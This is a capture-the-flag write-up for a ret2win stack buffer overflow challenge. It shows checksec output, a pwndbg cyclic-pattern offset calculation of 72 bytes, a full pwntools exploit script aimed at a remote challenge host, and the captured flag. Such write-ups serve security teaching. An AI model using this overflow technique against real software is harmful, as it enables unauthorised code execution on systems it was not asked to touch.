## Return to Win - pwn

>## Description
>Ada fungsi yang tak pernah dipanggil. Timpa return address ke sana.

---


>## Initial Analysis

We're given a 64-bit ELF binary named `be2`:
```
be2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=709b7ce4c2a63e7fd8d3ee676f7a7bd9eca3b215, 
for GNU/Linux 3.2.0, not stripped
```

>### Protections
```c
Arch:       amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Since PIE is disabled, the binary is loaded at a fixed base address. Therefore, the address of `win()` remains the same between the local and remote instances, assuming both use the same binary.

>## Solution

1. Generate a cyclic pattern.
2. Trigger the buffer overflow and inspect the overwritten stack value.
3. Calculate the offset to the saved RIP.
4. Build the ret2win payload and run the exploit.

```asm
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

Input that pattern

```asm
 RBP  0x6161617261616171 ('qaaaraaa')
 RSP  0x7fffffffdfc8 ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
 RIP  0x4012a5 (main+100) ◂— ret 
```

The cyclic pattern overwrites the saved RBP with `0x6161617261616171` (`qaaaraaa`).

```asm
pwndbg> cyclic -l 0x6161617261616171
Finding cyclic pattern of 4 bytes: b'qaaa' (hex: 0x71616161)
Found at offset 64
```

Because the value we found corresponds to the `saved RBP`, we need to account for the 8-byte `saved RBP` before reaching the `saved RIP`.

Therefore, the final offset to the `saved RIP` is:

```text
offset = 64 + 8
       = 72 bytes
```

Our payload would look like this

```python
payload = b'A' * 72 + win_addr
```

>### Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./be2_patched", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("51.79.201.156", 7013)

    return r


def main():
    r = conn()

    # good luck pwning :)
    offset = 72
    ret2win_addr = exe.symbols['win']

    payload = flat(
        b'A' * offset,
        ret2win_addr
        )

    r.sendlineafter(b'reach it?\n', payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

After we running the solver, we got the flag

![[Pasted image 20261003163953.png]]

>### Flag

```
REDLIMIT{try_1n_y0ur_m4ch1n3}
```
